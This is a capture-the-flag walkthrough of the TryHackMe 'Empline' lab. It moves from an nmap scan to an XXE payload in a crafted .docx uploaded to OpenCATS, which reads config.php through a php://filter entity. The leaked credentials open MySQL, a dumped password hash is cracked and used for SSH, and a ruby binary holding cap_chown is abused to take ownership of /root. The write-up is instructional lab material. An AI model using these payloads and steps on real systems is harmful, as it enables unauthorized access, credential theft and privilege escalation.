# Empline WriteUp
room Link:  'https://tryhackme.com/room/empline'

<p align="center">
  <img src="https://i.imgur.com/iGWyOuJ.png">
</p>


## Tasks:


User.txt


Root.txt

## 1- Enumeration:
>### Nmap:

```
❯ nmap -sC -sV -Pn -n -A 10.10.109.87
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-18 16:43 CET
Nmap scan report for 10.10.109.87
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 86
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, LongPassword, FoundRows, IgnoreSigpipes, LongColumnFlag, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 23Lb+Kw8QkIk_w]I8ws]
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=9/18%OT=22%CT=1%CU=35725%PV=Y%DS=2%DC=T%G=Y%TM=6146092
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(TI=Z%CI=Z)SEQ(SP=109%GCD=1%ISR=10B%TI=Z%CI=Z%TS=C)OPS(O1=M505ST11NW6%O2
OS:=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)W
OS:IN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F
OS:507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T
OS:3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   299.67 ms 10.8.0.1
2   299.75 ms 10.10.109.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.79 seconds


```
### Ports:
```
22,80,3306


```

>### Port 80

![1](https://user-images.githubusercontent.com/74853138/133894552-cab70a54-1a1e-4ba0-95c8-3a7d5c9898c3.png)

```
After doing some recon in this website i discovred a domaine and subdoamine.
```

![2](https://user-images.githubusercontent.com/74853138/133894635-dfca0a40-4d6c-4839-ad70-31fa81be69dc.png)

```
Let's add this two domaine and subdomaine to our /etc/hosts file
```
```
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       debian
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter

10.10.109.87    job.empline.thm empline.thm
```
```
Let's Enumerate the new subdomaine;
```

![3](https://user-images.githubusercontent.com/74853138/133894792-d7f5917a-06a1-465b-99e5-61ff638d9374.png)

![4](https://user-images.githubusercontent.com/74853138/133894795-c42aa724-ac33-40d9-affe-8df8a4b8f094.png)

![5](https://user-images.githubusercontent.com/74853138/133894797-91412fe7-c6a4-4622-9971-ed07759d5172.png)

![6](https://user-images.githubusercontent.com/74853138/133894798-0599c48a-3e6e-4f53-b723-4295ff2ca1bc.png)


![7](https://user-images.githubusercontent.com/74853138/133894799-d13306c8-36ce-470f-9f39-5d6d72827d9c.png)

```
after doing some recon and reseach on google, i found that this version is vulnurable to XXE, in uploading docx file.
```
>### XXE Payload 

```
First let's create a new document office word, with docx extention, i create one from google doc.

```
![8](https://user-images.githubusercontent.com/74853138/133894890-a145a70e-850d-4f19-bf1e-909098f1215a.png)


```
first we will unzip the document.docx

❯ unzip cv.docx
Archive:  cv.docx
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: word/_rels/document.xml.rels  
  inflating: word/document.xml       
  inflating: word/styles.xml         
  inflating: word/theme/theme1.xml   
  inflating: word/fontTable.xml      
  inflating: word/settings.xml       
  inflating: [Content_Types].xml     
root@ubuntu ~/THM/empline                                                                                                                                              17:03:36
❯ 

and let's amend the word/document.xml

and add this line

<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>

```

![9](https://user-images.githubusercontent.com/74853138/133895115-a1c0892a-08a5-411d-9d02-dc0fd521156e.png)


```
and add '&test;' as paragraph
zip this two files together 

and update this file 
```
![10](https://user-images.githubusercontent.com/74853138/133895186-5c2683dd-d97f-42e2-ac14-ec197775e894.png)

![11](https://user-images.githubusercontent.com/74853138/133895224-0f30714e-3c7a-4878-8cec-f9802ee75009.png)


![12](https://user-images.githubusercontent.com/74853138/133895270-4a8121b5-923c-4835-bd9c-3c06c44983bb.png)

```
let's decode this 

```
![13](https://user-images.githubusercontent.com/74853138/133895271-2ad689d7-1bf4-4577-937e-6b822cea5c29.png)


```
here we got the configuration of this opencats.
user and password
```

>## Port 3306

```
we will use this credential to access Msql

```


```

❯ mysql -h 10.10.109.87 -u james -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 101
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.131 sec)

MariaDB [(none)]> use opencats;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [opencats]> show tables;
+--------------------------------------+
| Tables_in_opencats                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
| attachment                           |
| calendar_event                       |
| calendar_event_type                  |
| candidate                            |
| candidate_joborder                   |
| candidate_joborder_status            |
| candidate_joborder_status_history    |
| candidate_jobordrer_status_type      |
| candidate_source                     |
| candidate_tag                        |
| career_portal_questionnaire          |
| career_portal_questionnaire_answer   |
| career_portal_questionnaire_history  |
| career_portal_questionnaire_question |
| career_portal_template               |
| career_portal_template_site          |
| company                              |
| company_department                   |
| contact                              |
| data_item_type                       |
| eeo_ethnic_type                      |
| eeo_veteran_type                     |
| email_history                        |
| email_template                       |
| extension_statistics                 |
| extra_field                          |
| extra_field_settings                 |
| feedback                             |
| history                              |
| http_log                             |
| http_log_types                       |
| import                               |
| installtest                          |
| joborder                             |
| module_schema                        |
| mru                                  |
| queue                                |
| saved_list                           |
| saved_list_entry                     |
| saved_search                         |
| settings                             |
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
54 rows in set (0.097 sec)


```

```

 1 | george         |                      |
  86d0df[HIDDEN]]4407947356ac |                                                         

| james          |                      |
 e53fbdb3[HIDDEN]]7c473c9 |        |                            0 | NULL                            |                        15 | NULL                                                                                                                
```


```
Here we got new user hash
let's carck the hash
```

![IMG_20210920_155555](https://user-images.githubusercontent.com/74853138/134024348-f2d8155f-3ccf-4f78-adde-6043f3be29e0.jpg)

>## Port 22
```
after cracking this hash we got a password for george.
let's connect to ssh with tis new credential.
```
## User.txt

```
❯ ssh george@10.10.109.87
The authenticity of host '10.10.109.87 (10.10.109.87)' can't be established.
ECDSA key fingerprint is SHA256:n1VBkoadDagInc43DVI4nN/rdenjZOWjrLxHworrEqk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.109.87' (ECDSA) to the list of known hosts.
george@10.10.109.87's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 18 16:18:34 UTC 2021

  System load:  0.0               Processes:           94
  Usage of /:   4.4% of 38.71GB   Users logged in:     0
  Memory usage: 52%               IP address for eth0: 10.10.109.87
  Swap usage:   0%


28 updates can be applied immediately.
7 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

george@empline:~$ ls -lsa
total 20
4 drwxrwx--- 4 george george 4096 Sep 18 16:18 .
4 drwxr-xr-x 4 root   root   4096 Jul 20 19:48 ..
4 drwx------ 2 george george 4096 Sep 18 16:18 .cache
4 drwx------ 3 george george 4096 Sep 18 16:18 .gnupg
4 -rw-r--r-- 1 root   root     33 Jul 20 19:48 user.txt
george@empline:~$ cat user.txt
91cb8[HIDDEN]]b099078e
george@empline:~$ 

```
># Privilege Escalation

```
after do some enumeration and upload linpeas, i run this command

george@empline:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
george@empline:~$ 

let's do some research for this ruby chown, The goal is to take ownership of a file.

```
![15](https://user-images.githubusercontent.com/74853138/133895567-85a33207-79fa-40f9-a181-2213afb2b885.png)

![16](https://user-images.githubusercontent.com/74853138/133895569-7f4bccb6-5e95-4aa4-9d04-38132ad92077.png)


```
so our command should be like that; 

/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown "george", "george", "/root/"'


```

```
george@empline:~$ /usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown "george", "george", "/root/"'
george@empline:~$ cd /root
george@empline:/root$ 

```

```
as you can see we able to access root folder

then lest read root.txt
```
>## root.txt

```
george@empline:/root$ cat root.txt 
74fea7cd0[HIDDEN]]54bc68f5d5
george@empline:/root$ 

```
>## Thank you.
